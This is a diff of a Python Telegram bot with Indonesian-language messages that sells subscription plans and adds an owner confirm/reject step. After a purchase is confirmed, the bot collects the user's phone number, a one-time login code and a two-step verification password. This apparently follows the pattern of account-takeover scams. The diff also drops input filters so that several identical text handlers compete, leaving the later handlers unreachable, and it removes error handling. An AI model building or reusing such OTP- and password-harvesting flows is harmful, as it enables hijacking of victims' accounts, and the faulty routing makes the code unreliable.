@@ -188,29 +188,47 @@ async def handle_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text("📨 Pesan sudah dikirim ke user.")
 
 
-# Error
-async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
-    logger.error(msg="Exception while handling an update:", exc_info=context.error)
+# Handle konfirmasi atau tolak oleh owner
+async def handle_konfirmasi_tolak(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+
+    # Ambil data user yang sesuai dari caption pesan
+    user_id = int(query.message.caption.split("\n")[2].split(":")[1].strip())
+    
+    if query.data == "konfirmasi":
+        # Kirim pesan ke user untuk konfirmasi pembelian
+        await context.bot.send_message(
+            chat_id=user_id,
+            text="✅ Pembelian kamu telah dikonfirmasi! Selamat! Silakan lanjutkan ke langkah pertama.\n\n"
+                 "📱 Masukkan nomor HP yang akan digunakan."
+        )
+        
+        # Lanjutkan ke Step 1 (input nomor HP)
+        await query.edit_message_text(text="✅ Pembelian telah dikonfirmasi.")
+    else:
+        await context.bot.send_message(
+            chat_id=user_id,
+            text="❌ Pembelian kamu ditolak. Silakan hubungi admin untuk informasi lebih lanjut."
+        )
+        await query.edit_message_text(text="❌ Pembelian ditolak.")
 
 
-# MAIN
 def main():
     app = ApplicationBuilder().token(API_TOKEN).build()
-
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CallbackQueryHandler(menu, pattern="^menu$"))
-    app.add_handler(CallbackQueryHandler(payment_method, pattern="^(1_bulan|3_bulan|6_bulan|12_bulan)$"))
-    app.add_handler(CallbackQueryHandler(info_pembayaran, pattern="^bayar_(qris|bank|dana|gopay)$"))
-
+    app.add_handler(CallbackQueryHandler(menu, pattern="menu"))
+    app.add_handler(CallbackQueryHandler(payment_method, pattern="1_bulan|3_bulan|6_bulan|12_bulan"))
+    app.add_handler(CallbackQueryHandler(info_pembayaran, pattern="bayar_qris|bayar_bank|bayar_dana|bayar_gopay"))
     app.add_handler(MessageHandler(filters.PHOTO, handle_media))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.Regex(r"^\+?\d{9,15}$"), handle_phone))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.Regex(r"^\d{4,8}$"), handle_otp))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_otp))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_verifikasi_dua_langkah))
-    app.add_handler(MessageHandler(filters.TEXT & filters.REPLY, handle_reply))
+    app.add_handler(CallbackQueryHandler(handle_konfirmasi_tolak, pattern="konfirmasi|tolak"))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_reply))
 
-    app.add_error_handler(error_handler)
     app.run_polling()
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
